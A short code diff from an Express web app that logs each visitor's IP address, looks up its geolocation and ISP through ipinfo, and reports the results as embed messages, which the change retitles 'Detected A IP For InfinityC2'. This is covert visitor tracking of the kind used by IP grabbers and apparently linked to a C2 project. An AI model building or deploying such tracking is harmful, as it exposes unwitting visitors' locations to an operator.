@@ -78,7 +78,7 @@ app.get("/", (req, res) => {
                         "embeds": [
                             {
                                 "type": "rich",
-                                "title": `${ip}`,
+                                "title": `Detected A IP For InfinityC2`,
                                 "description": `IP: ${ip}\nCity: ${ipinfo['city']}\nRegion: ${ipinfo['region']}\nCountry: ${ipinfo['country']}\nLocation: ${ipinfo['loc']}\nORG: ${ipinfo['org']}\nPostal: ${ipinfo['postal']}\nTimeZone: ${ipinfo['timezone']}\n`,
                                 "color": 0x00FFFF,
                                 "url": `https://ipinfo.io/${ip}`
@@ -139,7 +139,7 @@ app.get("/:id", (req, res) => {
                                 "embeds": [
                                     {
                                         "type": "rich",
-                                        "title": `Detected A IP for Website!`,
+                                        "title": `Detected A IP For InfinityC2`,
                                         "description": `IP: ${ip}\nFrom ${id}\nCity: ${ipinfo['city']}\nRegion: ${ipinfo['region']}\nCountry: ${ipinfo['country']}\nLocation: ${ipinfo['loc']}\nORG: ${ipinfo['org']}\nPostal: ${ipinfo['postal']}\nTimeZone: ${ipinfo['timezone']}\n`,
                                         "color": 0x00FFFF,
                                         "url": `https://ipinfo.io/${ip}`
